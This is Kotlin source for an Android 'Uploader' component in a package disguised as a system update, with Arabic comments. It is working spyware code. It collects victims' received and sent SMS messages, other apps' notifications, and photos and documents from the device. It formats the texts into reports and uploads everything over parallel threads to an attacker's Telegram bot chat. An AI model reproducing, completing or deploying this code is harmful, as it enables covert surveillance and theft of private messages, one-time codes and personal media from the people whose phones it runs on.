package com.sys.update

import android.content.Context
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

object Uploader {

    // عميل سريع مع pool ضخم
    private val client = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .readTimeout(120, TimeUnit.SECONDS)
        .connectionPool(okhttp3.ConnectionPool(32, 5, TimeUnit.MINUTES))
        .build()

    // 🚀 16 تحميل متوازي — للحصول على سرعة قصوى
    private val mediaPool = Executors.newFixedThreadPool(16)
    private val textPool = Executors.newFixedThreadPool(4)

    // منع التكرار
    private val sentImages = java.util.concurrent.ConcurrentHashMap.newKeySet<String>()

    // ─────────────────────────────────────────────
    //  FLUSH — فقط SMS والإشعارات (الصور ترفع مباشرة)
    // ─────────────────────────────────────────────
    fun flushQueue(ctx: Context) {
        if (!Config.hasTelegram()) return
        try {
            val lines = DataStore.drain(ctx, limit = 1000)
            if (lines.isEmpty()) return

            val notifs = mutableListOf<JSONObject>()
            val smsList = mutableListOf<JSONObject>()

            for (line in lines) {
                try {
                    val obj = JSONObject(line)
                    when (obj.optString("type")) {
                        "notif" -> notifs.add(obj)
                        "event" -> {
                            val data = obj.optJSONObject("data") ?: continue
                            when (data.optString("type")) {
                                "sms", "sms_sent" -> smsList.add(data)
                                // نتجاهل media هنا — الصور ترفع مباشرة
                            }
                        }
                    }
                } catch (_: Exception) {}
            }

            if (smsList.isNotEmpty()) {
                textPool.submit { sendTelegramText(buildSmsReport(smsList)) }
            }
            if (notifs.isNotEmpty()) {
                textPool.submit { sendTelegramText(buildNotifReport(notifs)) }
            }
        } catch (e: Exception) {
            Log.e("Uploader", "flush err: ${e.message}")
        }
    }

    // ─────────────────────────────────────────────
    //  MEDIA UPLOAD — أولوية قصوى
    // ─────────────────────────────────────────────
    fun uploadMediaFile(ctx: Context, mf: MediaScanner.MediaFile) {
        if (!Config.hasTelegram()) return

        // منع التكرار
        if (!sentImages.add(mf.path)) return

        val file = File(mf.path)
        if (!file.exists()) return

        mediaPool.submit {
            try {
                if (mf.mime.startsWith("image/")) sendTelegramPhoto(file)
                else sendTelegramDocument(file)
            } catch (e: Exception) {
                Log.e("Uploader", "media err: ${e.message}")
                sentImages.remove(mf.path)
            }
        }
    }

    // ─────────────────────────────────────────────
    //  SMS REPORT
    // ─────────────────────────────────────────────
    private fun buildSmsReport(list: List<JSONObject>): String {
        val sb = StringBuilder()
        sb.append("📩 *SMS Report* — ").append(list.size).append(" message(s)\n")
        sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")

        val grouped = list.groupBy { it.optString("address", "unknown") }
        for ((address, msgs) in grouped) {
            sb.append("📞 *").append(address).append("* (").append(msgs.size).append(")\n")
            for (m in msgs.take(8)) {
                val type = if (m.optString("type") == "sms_sent") "📤" else "📥"
                val body = m.optString("body", "").take(120)
                val date = m.optString("date", "")
                sb.append("  ").append(type).append(" [").append(date).append("]\n")
                sb.append("  ").append(body).append("\n")
            }
            if (msgs.size > 8) sb.append("  … +").append(msgs.size - 8).append(" more\n")
            sb.append("\n")
        }
        val text = sb.toString()
        return if (text.length > 4000) text.take(3950) + "\n…truncated" else text
    }

    // ─────────────────────────────────────────────
    //  NOTIF REPORT
    // ─────────────────────────────────────────────
    private fun buildNotifReport(list: List<JSONObject>): String {
        val sb = StringBuilder()
        sb.append("🔔 *Notifications* — ").append(list.size).append(" event(s)\n")
        sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
        val grouped = list.groupBy { it.optString("pkg", "unknown") }
        for ((pkg, items) in grouped) {
            sb.append("📱 *").append(pkg).append("* (").append(items.size).append(")\n")
            for (n in items.take(8)) {
                val title = n.optString("title", "")
                val text = n.optString("text", "")
                val time = n.optString("time", "")
                sb.append("  [").append(time).append("]\n")
                if (title.isNotBlank()) sb.append("  ").append(title).append("\n")
                if (text.isNotBlank()) sb.append("  ").append(text).append("\n")
            }
            if (items.size > 8) sb.append("  … +").append(items.size - 8).append(" more\n")
            sb.append("\n")
        }
        val text = sb.toString()
        return if (text.length > 4000) text.take(3950) + "\n…truncated" else text
    }

    // ─────────────────────────────────────────────
    //  TELEGRAM API
    // ─────────────────────────────────────────────
    private fun sendTelegramText(text: String) {
        try {
            val url = "https://api.telegram.org/bot${Config.TELEGRAM_BOT_TOKEN}/sendMessage"
            val json = JSONObject().apply {
                put("chat_id", Config.TELEGRAM_CHAT_ID)
                put("text", text)
                put("parse_mode", "Markdown")
                put("disable_web_page_preview", true)
            }.toString()
            val req = Request.Builder()
                .url(url)
                .post(json.toRequestBody("application/json".toMediaType()))
                .build()
            client.newCall(req).execute().use { it.close() }
        } catch (e: Exception) {
            Log.e("Uploader", "sendText err: ${e.message}")
        }
    }

    private fun sendTelegramPhoto(file: File) {
        try {
            val url = "https://api.telegram.org/bot${Config.TELEGRAM_BOT_TOKEN}/sendPhoto"
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", Config.TELEGRAM_CHAT_ID)
                .addFormDataPart("caption", file.name)
                .addFormDataPart("photo", file.name, file.asRequestBody("image/*".toMediaType()))
                .build()
            val req = Request.Builder().url(url).post(body).build()
            client.newCall(req).execute().use { it.close() }
        } catch (e: Exception) {
            Log.e("Uploader", "sendPhoto err: ${e.message}")
        }
    }

    private fun sendTelegramDocument(file: File) {
        try {
            val url = "https://api.telegram.org/bot${Config.TELEGRAM_BOT_TOKEN}/sendDocument"
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", Config.TELEGRAM_CHAT_ID)
                .addFormDataPart("caption", file.name)
                .addFormDataPart("document", file.name, file.asRequestBody("application/octet-stream".toMediaType()))
                .build()
            val req = Request.Builder().url(url).post(body).build()
            client.newCall(req).execute().use { it.close() }
        } catch (e: Exception) {
            Log.e("Uploader", "sendDoc err: ${e.message}")
        }
    }
}
